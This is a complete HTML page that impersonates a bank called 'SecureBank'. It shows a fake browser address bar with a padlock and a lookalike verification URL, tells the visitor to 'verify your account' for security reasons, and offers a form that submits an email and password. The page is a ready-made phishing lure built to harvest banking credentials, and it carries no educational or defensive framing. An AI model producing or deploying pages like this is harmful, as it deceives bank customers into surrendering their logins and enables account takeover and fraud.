<!DOCTYPE html>
<html>
<head>
    <title>SecureBank - Account Verification</title>
    <style>
        body {
            font-family: Arial;
            background-color: #e6e6e6;
            margin: 0;
        }

        .fake-url {
            background: #ddd;
            padding: 8px;
            font-size: 14px;
            color: #333;
        }

        .login-box {
            background: white;
            padding: 30px;
            border-radius: 8px;
            width: 350px;
            margin: 80px auto;
            box-shadow: 0 0 15px rgba(0,0,0,0.2);
        }

        h2 {
            text-align: center;
            color: #003366;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #003366;
            color: white;
            border: none;
        }

        .warning-text {
            font-size: 13px;
            color: gray;
            text-align: center;
        }
    </style>
</head>

<body>

<div class="fake-url">
    🔒 https://secure-bank-verification.com/login
</div>

<div class="login-box">
    <h2>SecureBank</h2>
    <p class="warning-text">
        For security reasons, please verify your account.
    </p>

    <form action="/login" method="POST">
        <input type="email" name="email" placeholder="Email address" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Verify Account</button>
    </form>
</div>

</body>
</html>
